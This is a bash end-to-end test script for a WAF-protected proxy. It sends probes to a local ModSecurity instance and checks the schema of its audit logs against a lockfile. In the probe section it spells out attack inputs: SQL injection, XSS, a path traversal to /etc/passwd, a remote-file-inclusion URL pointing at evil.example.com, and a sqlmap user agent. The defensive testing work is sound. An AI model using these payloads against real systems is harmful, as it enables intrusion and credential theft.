#!/usr/bin/env bash
# Capture ModSecurity audit JSON from the running e2e stack, extract a
# key+type schema, and diff it against the committed lockfile. Failing this
# diff means a ModSec bump changed the audit payload — the Go parser at
# api/internal/service/log_collector_parser.go may need updating before the
# next release. Stability hardening M4.1-M4.2.
#
# Layout:
#   - Probes a WAF-enabled proxy host with SQLi/XSS/LFI/RFI/scanner UA.
#   - Captures audit JSON from `docker logs npg-test-proxy` (SecAuditLog is
#     routed to /dev/stdout in modsec-base.conf).
#   - Wraps entries as a JSON array, feeds to extract-schema.jq, compares
#     with testdata/modsec_audit_schema.json.
#
# Auth: TEST_USER / TEST_PASS env vars (defaults match test/e2e fixtures).

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
COMPOSE_FILE="${REPO_ROOT}/docker-compose.e2e-test.yml"
DOCKERFILE="${REPO_ROOT}/nginx/Dockerfile"
SCHEMA_JQ="${REPO_ROOT}/scripts/extract-schema.jq"
TESTDATA_DIR="${REPO_ROOT}/api/internal/service/testdata"
LOCKFILE="${TESTDATA_DIR}/modsec_audit_schema.json"

API_BASE="${API_BASE:-http://127.0.0.1:19080}"
PROXY_HTTP="${PROXY_HTTP:-http://127.0.0.1:18080}"
PROXY_CONTAINER="${PROXY_CONTAINER:-npg-test-proxy}"
TEST_USER="${TEST_USER:-testadmin}"
TEST_PASS="${TEST_PASS:-TestAdmin123!}"

# A unique-ish domain so concurrent runs don't clash and previous-run cruft
# doesn't poison the audit log filter.
PROBE_DOMAIN="modsec-capture-$$-$(date +%s).local"

TMP_DIR="$(mktemp -d -t modsec-capture-XXXXXX)"
HOST_ID=""
TOKEN=""

cleanup() {
  local rc=$?
  if [[ -n "${HOST_ID}" && -n "${TOKEN}" ]]; then
    curl -s -o /dev/null -X DELETE \
      -H "Authorization: Bearer ${TOKEN}" \
      "${API_BASE}/api/v1/proxy-hosts/${HOST_ID}" || true
  fi
  rm -rf "${TMP_DIR}"
  exit "${rc}"
}
trap cleanup EXIT INT TERM

log() { printf '[capture] %s\n' "$*" >&2; }
err() { printf '[capture] ERROR: %s\n' "$*" >&2; }

# ---------- 1) ModSec version ----------
if [[ ! -f "${DOCKERFILE}" ]]; then
  err "nginx/Dockerfile not found at ${DOCKERFILE}"
  exit 1
fi
MODSEC_VERSION="$(grep -E '^ARG MODSECURITY_VERSION=' "${DOCKERFILE}" | head -1 | sed -E 's/.*=([^[:space:]]+).*/\1/')"
if [[ -z "${MODSEC_VERSION}" ]]; then
  err "Could not detect MODSECURITY_VERSION from ${DOCKERFILE}"
  exit 1
fi
log "ModSecurity version: ${MODSEC_VERSION}"

SAMPLE_FILE="${TESTDATA_DIR}/modsec_audit_v${MODSEC_VERSION}.json"

# ---------- 2) Ensure e2e stack is up ----------
if ! docker compose -f "${COMPOSE_FILE}" ps --status running --format '{{.Name}}' 2>/dev/null | grep -q "${PROXY_CONTAINER}"; then
  log "E2E stack not running, starting with 'up -d --wait'..."
  docker compose -f "${COMPOSE_FILE}" up -d --wait
fi

# Sanity: the proxy must respond on PROXY_HTTP.
if ! curl -s -o /dev/null -w '%{http_code}' --max-time 5 "${PROXY_HTTP}/" | grep -qE '^(2|3|4|5)'; then
  err "Proxy at ${PROXY_HTTP} not responding. Is the e2e stack healthy?"
  exit 1
fi

# ---------- 3) Login ----------
log "Authenticating as ${TEST_USER}..."
LOGIN_RESP="$(curl -s -X POST "${API_BASE}/api/v1/auth/login" \
  -H 'Content-Type: application/json' \
  -d "$(jq -nc --arg u "${TEST_USER}" --arg p "${TEST_PASS}" '{username:$u, password:$p}')")"
TOKEN="$(printf '%s' "${LOGIN_RESP}" | jq -r '.token // empty')"
if [[ -z "${TOKEN}" ]]; then
  err "Login failed. Response: ${LOGIN_RESP}"
  err "Hint: set TEST_USER / TEST_PASS env vars to match the seeded test admin."
  exit 1
fi
log "Login OK."

# ---------- 4) Create WAF-enabled probe host ----------
log "Creating probe host ${PROBE_DOMAIN}..."
CREATE_REQ="$(jq -nc --arg d "${PROBE_DOMAIN}" '{
  domain_names:[$d],
  forward_scheme:"http",
  forward_host:"127.0.0.1",
  forward_port:80,
  waf_enabled:true,
  waf_mode:"blocking",
  waf_paranoia_level:1,
  waf_anomaly_threshold:5,
  enabled:true
}')"
CREATE_RESP="$(curl -s -X POST "${API_BASE}/api/v1/proxy-hosts" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d "${CREATE_REQ}")"
HOST_ID="$(printf '%s' "${CREATE_RESP}" | jq -r '.id // empty')"
if [[ -z "${HOST_ID}" ]]; then
  err "Proxy host creation failed. Response: ${CREATE_RESP}"
  exit 1
fi
log "Probe host id: ${HOST_ID}"

# Give nginx a beat to load the new config (the API blocks until reload, but
# the WAF chain may still be initializing on first request).
sleep 1

# ---------- 5) Probe set ----------
# `--since` timestamp narrows docker logs to entries produced by this run.
# Use UTC and trim subsecond noise so docker accepts it.
SINCE_TS="$(date -u +%Y-%m-%dT%H:%M:%S)"

probe() {
  local label="$1" path="$2" ua="${3:-modsec-capture/1.0}"
  curl -s -o /dev/null -w "  ${label}: HTTP %{http_code}\n" \
    -H "Host: ${PROBE_DOMAIN}" \
    -H "User-Agent: ${ua}" \
    --max-time 5 \
    "${PROXY_HTTP}${path}" || true
}

log "Firing probes..."
probe "sqli-union"   "/?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
probe "sqli-or"      "/?q=1%20OR%201=1"
probe "xss-script"   "/?msg=%3Cscript%3Ealert(1)%3C/script%3E"
probe "xss-img"      "/?msg=%3Cimg%20src=x%20onerror=alert(1)%3E"
probe "lfi-etc"      "/?file=../../../../etc/passwd"
probe "rfi-remote"   "/?include=http://evil.example.com/shell.txt"
probe "scanner-ua"   "/"                                          "sqlmap/1.5.2#stable"

# Allow nginx/ModSec a moment to flush the audit JSON to stdout.
sleep 2

# ---------- 6) Pull audit JSON from docker logs ----------
RAW_LOG="${TMP_DIR}/docker.log"
docker logs --since "${SINCE_TS}" "${PROXY_CONTAINER}" >"${RAW_LOG}" 2>&1 || true

# Filter audit entries: each line begins with {"transaction":. Non-JSON
# event lines (nginx errors, info banners) are skipped here.
AUDIT_LINES="${TMP_DIR}/audit.lines"
grep -E '^\{"transaction":' "${RAW_LOG}" >"${AUDIT_LINES}" || true

# Keep only entries actually triggered by our probe domain — this run may
# share the container with concurrent E2E tests that emit unrelated audit
# events.
FILTERED="${TMP_DIR}/audit.filtered"
grep -F "\"${PROBE_DOMAIN}\"" "${AUDIT_LINES}" >"${FILTERED}" || true

ENTRY_COUNT="$(wc -l <"${FILTERED}" | tr -d ' ')"
if [[ "${ENTRY_COUNT}" -eq 0 ]]; then
  err "No audit entries captured for ${PROBE_DOMAIN}."
  err "First 20 lines of raw docker logs (for debugging):"
  head -20 "${RAW_LOG}" >&2 || true
  exit 1
fi
log "Captured ${ENTRY_COUNT} audit JSON entries."

# Wrap entries as a JSON array (jq -s).
SAMPLE_JSON="${TMP_DIR}/samples.json"
jq -s '.' "${FILTERED}" >"${SAMPLE_JSON}"

# ---------- 7) Extract schema ----------
NEW_SCHEMA="${TMP_DIR}/schema.json"
jq -f "${SCHEMA_JQ}" "${SAMPLE_JSON}" >"${NEW_SCHEMA}"

# ---------- 8) Diff against lockfile ----------
mkdir -p "${TESTDATA_DIR}"

if [[ ! -f "${LOCKFILE}" ]]; then
  log "No lockfile at ${LOCKFILE} — first run, saving as initial baseline."
  cp "${NEW_SCHEMA}" "${LOCKFILE}"
  cp "${SAMPLE_JSON}" "${SAMPLE_FILE}"
  log "Wrote:"
  log "  ${LOCKFILE}"
  log "  ${SAMPLE_FILE}"
  log "Review and commit these files."
  exit 0
fi

# Normalize both schemas with jq -S so the diff is purely semantic.
EXPECTED="${TMP_DIR}/expected.json"
ACTUAL="${TMP_DIR}/actual.json"
jq -S . "${LOCKFILE}"   >"${EXPECTED}"
jq -S . "${NEW_SCHEMA}" >"${ACTUAL}"

if diff -u "${EXPECTED}" "${ACTUAL}" >"${TMP_DIR}/schema.diff"; then
  log "[OK] Schema unchanged (ModSec ${MODSEC_VERSION} matches lockfile)."
  # Refresh sample fixture even on success — the diff is on schema, not on
  # exact payload values, but keeping a recent capture aids debugging.
  # NOTE: only write if version-specific file is missing, to avoid churn.
  if [[ ! -f "${SAMPLE_FILE}" ]]; then
    cp "${SAMPLE_JSON}" "${SAMPLE_FILE}"
    log "Sample fixture for v${MODSEC_VERSION} was missing — wrote ${SAMPLE_FILE}."
  fi
  exit 0
fi

err "Schema drift detected for ModSec ${MODSEC_VERSION}:"
cat "${TMP_DIR}/schema.diff" >&2
err ""
err "Next steps:"
err "  1) Review the diff above against the ModSec ${MODSEC_VERSION} changelog."
err "  2) If the Go parser (api/internal/service/log_collector_parser.go,"
err "     type ModSecAuditLog) needs to handle a new/renamed/retyped field,"
err "     update it AND add a corresponding regression test."
err "  3) Once the parser is in sync, refresh the lockfile + sample:"
err "       cp ${NEW_SCHEMA} ${LOCKFILE}"
err "       cp ${SAMPLE_JSON} ${SAMPLE_FILE}"
err "     and commit alongside the parser change."
exit 1
